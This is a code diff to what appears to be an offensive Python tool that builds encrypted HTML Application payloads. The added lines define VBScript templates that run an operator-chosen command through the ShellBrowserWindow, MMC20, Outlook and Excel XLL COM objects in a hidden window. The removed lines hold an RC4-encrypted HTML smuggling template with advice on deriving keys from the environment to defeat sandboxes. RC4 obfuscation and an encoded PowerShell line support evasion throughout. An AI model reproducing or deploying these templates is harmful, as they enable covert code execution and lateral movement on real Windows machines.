@@ -8,25 +8,9 @@ import argparse
 import os
 import sys
 
-#POWERSHELL_CMD = "powershell -noP -w 1 -enc  YwBhAGwAYwAuAGUAeABlAA=="
-HTML_TEMPLATE = """<html>
-<body>
-<script>
-function {5}(r,o){{for(var t,e=[],n=0,a="",f=0;f<256;f++)e[f]=f;for(f=0;f<256;f++)n=(n+e[f]+r.charCodeAt(f%r.length))%256,t=e[f],e[f]=e[n],e[n]=t;f=0,n=0;for(var h=0;h<o.length;h++)n=(n+e[f=(f+1)%256])%256,t=e[f],e[f]=e[n],e[n]=t,a+=String.fromCharCode(o.charCodeAt(h)^e[(e[f]+e[n])%256]);return a}}
-
-// you need to insert your own key environmental derivation function below. It must store the key in the variable called: {0}
-// By default htagen will just use your key straight up. Instead you should derive your key from the environment
-// so that it only works on your intended target (and not in a sandbox). See virginkey.js for an example.
-var {0} = function(){{return "{6}"}};
-
-var {1} = "{2}";
-var {9} = {5}({0}(),atob("{10}"));
-setTimeout('var {3} = new '+{9}+'([{5}({0}(), atob({1}))])');
-var {8} = {5}({0}(),atob("{7}"));
-setTimeout({8}+'({3}, {5}({0}(), atob("{4}")))');
-</script>
-</body>
-</html>"""
+#TODO: load *all* templates from template folder rather than hard-coding
+with open("templates/hta_template.txt") as f:
+    HTML_TEMPLATE = f.read()
 
 WMI_HTA = """<html>
 <head>
@@ -34,7 +18,7 @@ WMI_HTA = """<html>
 Sub window_onload
 	const impersonation = 3
 	Const HIDDEN_WINDOW = 12
-	Set Locator = CreateObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
+	Set Locator = CreateObject("WbemScripting.SWbemLocator")
 	Set Service = Locator.ConnectServer()
 	Service.Security_.ImpersonationLevel=impersonation  
 	Set objStartup = Service.Get("Win32_ProcessStartup")
@@ -48,16 +32,38 @@ end sub
 </head>
 </html>"""
 #https://twitter.com/enigma0x3/status/870810601483894784
+#https://twitter.com/r0wdy_/status/871142675784671233
+
+SHELLBROWSER_HTA = """<script language="VBScript">
+Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
+obj.Document.Application.ShellExecute "{}",Null,"C:\Windows\System32",Null,0 
+self.close
+</script>"""
 #https://twitter.com/enigma0x3/status/890980564420788224
 
-COM_HTA = """<script language="VBScript">
+
+#Requires elevation :(
+MMC20_HTA = """<script language="VBScript">
+Set obj = GetObject("new:49B2791A-B1AE-4C90-9B8E-E860BA07F889")
+obj.Document.ActiveView.ExecuteShellCommand("{}")
+self.close
+</script>"""
+#https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
+
+
+OUTLOOK_HTA = """<script language="VBScript">
 Set obj = GetObject("new:0006F03A-0000-0000-C000-000000000046")
 obj.CreateObject("WScript.Shell").Run("{}")
 self.close
 </script>"""
 #https://gist.github.com/staaldraad/b0665993f49098e9b82a4fd4d135198f
 
-PAYLOAD_OPTIONS = {'WbemScripting.SWbemLocator': WMI_HTA, 'Outlook.Application': COM_HTA}
+# Experimental XLL feature - only tested on Office 2016 (x64)
+with open("templates/xll_hta.txt") as f:
+    XLL_HTA = f.read()
+
+PAYLOAD_OPTIONS = {'WbemScripting.SWbemLocator': WMI_HTA, 'Outlook.Application': OUTLOOK_HTA, "Excel.RegisterXLL": XLL_HTA, 
+"ShellBrowserWindow": SHELLBROWSER_HTA}
 
 def rc4(key, data):
     """
@@ -100,7 +106,7 @@ if __name__ == '__main__':
         sys.exit(1)
 	
     if args.key and args.command and args.output and args.payload:
-        hta_text = PAYLOAD_OPTIONS.get(args.payload).format(args.command)
+        hta_text = PAYLOAD_OPTIONS.get(args.payload).format(args.command, rand=rnd())
         hta_encrypted = base64.b64encode(rc4(args.key, hta_text))
         filename_encrypted = base64.b64encode(rc4(args.key, args.output))
         msSaveBlob = base64.b64encode(rc4(args.key, "navigator.msSaveBlob"))
